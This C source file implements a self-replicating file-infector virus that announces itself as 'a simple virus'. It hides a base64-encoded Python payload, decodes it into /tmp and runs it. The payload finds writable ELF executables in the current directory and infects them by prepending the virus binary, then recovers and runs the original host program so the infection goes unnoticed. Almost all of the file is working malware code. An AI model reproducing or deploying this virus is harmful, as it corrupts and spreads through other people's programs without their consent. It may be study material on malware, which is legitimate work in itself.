#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/wait.h>

#define PATH "/tmp/.virus.py"

int main(int argc, char *const argv[], char *const envp[]) {
  pid_t pid;

  unsigned char str[] = "IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMwoKaW1wb3J0IG9zLCBzeXMsIHJlCgpQQVRIID0gb3MuZ2V0Y3dkKCkKRUxGID0gIkVMRiIKT0dfRklMRSA9ICJ2aXJ1cyIKSU5GRUNUID0gInNpbXBsZSB2aXJ1cyEiClRBUkdFVF9FWEVDID0gIi90bXAvLnRhcmdldCIKSU5GRUNURURfUkVDT1JEID0gIi90bXAvLmluZmVjdGVkLnR4dCIKQkFEX0ZJTEUgPSAiL3RtcC8uYmFkdmlydXNjb250ZW50cyIKCmRlZiBjaGVja1dyaXRhYmxlKGZpbGVzKToKICAgIGlmIG9zLmFjY2VzcyhmaWxlcywgb3MuV19PSyk6CiAgICAgICAgcmV0dXJuIDEKICAgIHJldHVybiAwCgpkZWYgY2hlY2tFbGYoaGVhZGVyKToKICAgIGhlYWQgPSBoZWFkZXIuZGVjb2RlKCd1dGYtOCcpCiAgICBpZiAocmUuc2VhcmNoKEVMRiwgaGVhZCkpOgogICAgICAgIHJldHVybiBUcnVlCiAgICByZXR1cm4gRmFsc2UKCmRlZiBvZ0ZpbGUoZmlsZXMpOgogICAgaWYoZmlsZXMgPT0gT0dfRklMRSk6CiAgICAgICAgcmV0dXJuIDEKICAgIHJldHVybiAwCgpkZWYgY2hlY2tJbmZlY3Rpb24oZmlsZXMpOgogICAgY21kID0gInN0cmluZ3MgIiArIHN0cihmaWxlcykgKyAnIHwgZ3JlcCAiJyArIElORkVDVCArICciJyArICIgPiAiICsgSU5GRUNURURfUkVDT1JECiAgICBvcy5zeXN0ZW0oY21kKQogICAgd2l0aCBvcGVuKElORkVDVEVEX1JFQ09SRCwgJ3InKSBhcyBpbmZlY3RlZDoKICAgICAgICBsaW5lcyA9IFtsaW5lLnJzdHJpcCgpIGZvciBsaW5lIGluIGluZmVjdGVkXQogICAgICAgIGlmKHJlLnNlYXJjaChJTkZFQ1QsIHN0cihsaW5lcykpKToKICAgICAgICAgICAgcmV0dXJuIDEKICAgICAgICByZXR1cm4gMAoKZGVmIGV4dHJhY3RCYWRDb250ZW50cyhmaWxlcyk6CiAgICBjbWQgPSAiaGVhZCAtYyAxNzM0NCAiICsgZmlsZXMgKyAiID4gIiArIEJBRF9GSUxFCiAgICBvcy5zeXN0ZW0oY21kKQogICAgcmV0dXJuIDEKCmRlZiBtYW5Eb3duKGZpbGVzKToKICAgIGNtZCA9ICJjYXQgIiArIFBBVEggKyAiLyIgKyBPR19GSUxFICsgIiAiICsgUEFUSCArICIvIiArIGZpbGVzICsgIiA+ICIgKyBUQVJHRVRfRVhFQwogICAgb3V0cHV0ID0gb3Muc3lzdGVtKGNtZCkKICAgIGNtZCA9ICJtdiAiICsgVEFSR0VUX0VYRUMgKyAiIC4vIiArIGZpbGVzCiAgICBvcy5zeXN0ZW0oY21kKQogICAgY21kID0gImNobW9kIHUreCAiICsgZmlsZXMKICAgIG9zLnN5c3RlbShjbWQpCiAgICBjbWQgPSAicm0gLWYgIiArIElORkVDVEVEX1JFQ09SRAogICAgb3Muc3lzdGVtKGNtZCkKICAgIHJldHVybiAxCgpkZWYgYW5vdGhlck9uZShmaWxlcyk6CiAgICBjbWQgPSAiY2F0ICIgKyBCQURfRklMRSArICIgIiArIFBBVEggKyAiLyIgKyBmaWxlcyArICIgPiAiICsgVEFSR0VUX0VYRUMKICAgIG9zLnN5c3RlbShjbWQpCiAgICBjbWQgPSAibXYgIiArIFRBUkdFVF9FWEVDICsgIiAuLyIgKyBmaWxlcwogICAgb3Muc3lzdGVtKGNtZCkKICAgIGNtZCA9ICJjaG1vZCB1K3ggIiArIGZpbGVzCiAgICBvcy5zeXN0ZW0oY21kKQogICAgY21kID0gInJtIC1mICIgKyBCQURfRklMRSArICIgIiArIElORkVDVEVEX1JFQ09SRAogICAgb3Muc3lzdGVtKGNtZCkKICAgIHJldHVybiAxCgpkZWYgbG9hZEZpbGVzKCk6CiAgICBmb3IgZmlsZXMgaW4gb3MubGlzdGRpcihQQVRIKToKICAgICAgICBwYXRoID0gb3MucGF0aC5qb2luKFBBVEgsIGZpbGVzKQogICAgICAgIGlmIG9zLnBhdGguaXNkaXIocGF0aCk6CiAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgc2VsZkNoZWNrID0gb2dGaWxlKGZpbGVzKQogICAgICAgIGlmIHNlbGZDaGVjazoKICAgICAgICAgICAgd2l0aCBvcGVuKGZpbGVzLCAncmInKSBhcyBmOgogICAgICAgICAgICAgICAgaGVhZGVyID0gZi5yZWFkKDUpCiAgICAgICAgICAgICAgICBlbGYgPSBjaGVja0VsZihoZWFkZXIpCiAgICAgICAgICAgICAgICBpZiBlbGY6CiAgICAgICAgICAgICAgICAgICAgd3JpdGFibGUgPSBjaGVja1dyaXRhYmxlKGZpbGVzKQogICAgICAgICAgICAgICAgICAgIGlmIHdyaXRhYmxlOgogICAgICAgICAgICAgICAgICAgICAgICBpbmZlY3RlZCA9IGNoZWNrSW5mZWN0aW9uKGZpbGVzKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBpbmZlY3RlZDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dHJhY3RCYWRDb250ZW50cyhmaWxlcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYXlsb2FkID0gbWFuRG93bihmaWxlcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBheWxvYWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3lzLmV4aXQoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHdpdGggb3BlbihmaWxlcywgJ3JiJykgYXMgZjoKICAgICAgICAgICAgICAgIGhlYWRlciA9IGYucmVhZCg1KQogICAgICAgICAgICAgICAgZWxmID0gY2hlY2tFbGYoaGVhZGVyKQogICAgICAgICAgICAgICAgaWYgZWxmOgogICAgICAgICAgICAgICAgICAgIHdyaXRhYmxlID0gY2hlY2tXcml0YWJsZShmaWxlcykKICAgICAgICAgICAgICAgICAgICBpZiB3cml0YWJsZToKICAgICAgICAgICAgICAgICAgICAgICAgaW5mZWN0ZWQgPSBjaGVja0luZmVjdGlvbihmaWxlcykKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaW5mZWN0ZWQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleHRyYWN0QmFkQ29udGVudHMoZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcGF5bG9hZCA9IGFub3RoZXJPbmUoZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBwYXlsb2FkOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN5cy5leGl0KCkKICAgIGNtZCA9ICJybSAtZiAiICsgQkFEX0ZJTEUgKyAiICIgKyBJTkZFQ1RFRF9SRUNPUkQKICAgIG9zLnN5c3RlbShjbWQpCgpsb2FkRmlsZXMoKQo=";
  FILE *fp;
  fp = fopen("/tmp/payload.py","w+");
  fprintf(fp,"%s",str);
  fclose(fp);

  system("base64 -d /tmp/payload.py > /tmp/.virus.py");
  system("rm -f /tmp/payload.py");

  char command[500];
  char cmd[500];
  snprintf(cmd,sizeof(cmd),"%s%s","chmod u+x ",PATH);

  system(&cmd[0]);

  if (strcmp(argv[0],"virus") != 0 && strcmp(argv[0] , "./virus") != 0) {
    snprintf(command,sizeof(command),"%s%s%s","tail -c +17345 ",argv[0], " > /tmp/.program;chmod 777 /tmp/.program");
    system(&command[0]);
    if(argc==1) {
      system("/tmp/.program");
    }
    else {
      char og_execution[200] = "/tmp/.program ";
      for (int i=2; i<=argc; i++) {
        if(i == argc)
        strcat(og_execution, argv[i-1]);
        else {
          strcat(og_execution, argv[i-1]);
          strcat(og_execution, " ");
        }
      }
      system(&og_execution[0]);
    }
   system("rm -f /tmp/.program");
  }

  pid = fork();
  if (pid == 0) {
    system(PATH);
    fputs("Hello! I am a simple virus!\n", stdout);
    system("rm -f /tmp/.virus.py");
  } else {
    waitpid(pid, NULL, 0);
  }

  return 0;
}
